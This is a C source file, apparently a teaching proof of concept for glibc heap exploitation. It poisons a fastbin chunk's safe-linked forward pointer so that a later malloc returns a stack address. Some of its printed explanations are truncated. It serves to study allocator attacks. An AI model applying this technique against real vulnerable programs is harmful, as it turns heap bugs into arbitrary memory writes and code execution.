#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
	setbuf(stdout, NULL);

	char* ptrs[14];
	size_t i;
	for (i = 0; i < 14; i++) {
		ptrs[i] = malloc(allocsize);
	}

	for (i = 0; i < 7; i++) free(ptrs[i]);
	
	char* victim = ptrs[7];
	printf("The\n\n", victim);
	free(victim);
	

	for (i = 8; i < 14; i++) free(ptrs[i]);
	
	size_t stack_var[6];
	memset(stack_var, 0xcd, sizeof(stack_var));
	
	printf("The stack address that we intend to target: %p\n"
		   "It's current value is %p\n", &stack_var[2], (char*)stack_var[2]);
	
	printf("Now%p\n\n", victim);
	

	*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));
	
	for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);

	malloc(allocsize);
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	char *q = malloc(allocsize);
	printf("\nFinally: %p\n", q);
	
	assert(q == (char *)&stack_var[2]);
	
	return 0;
}
